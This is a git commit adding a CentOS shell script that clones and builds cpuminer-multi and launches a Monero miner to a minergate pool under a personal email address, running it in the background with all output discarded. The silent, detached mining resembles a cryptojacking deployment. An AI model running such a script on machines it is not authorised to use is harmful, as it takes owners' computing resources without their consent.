d09c35c896c47c837d0fbd2f55d5b13bd1f0cff6
gamerok69 <14660687+gamerok69@users.noreply.github.com>
2020-06-25 14:52:44 +0300

    Add files via upload

---
+++ centos.sh
@@ -0,0 +1,19 @@
+yum groupinstall "Development Tools"
+
+yum install curl-devel openssl-devel git screen
+
+screen
+
+cd /usr/local/src/
+
+git clone https://github.com/tpruvot/cpuminer-multi.git
+
+cd cpuminer-multi
+
+./autogen.sh
+
+./configure CFLAGS="-march=native" --with-crypto --with-curl
+
+./build.sh
+
+./cpuminer -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45700 -u wildestier8@gmail.com -p x > /dev/null 2>&1 &
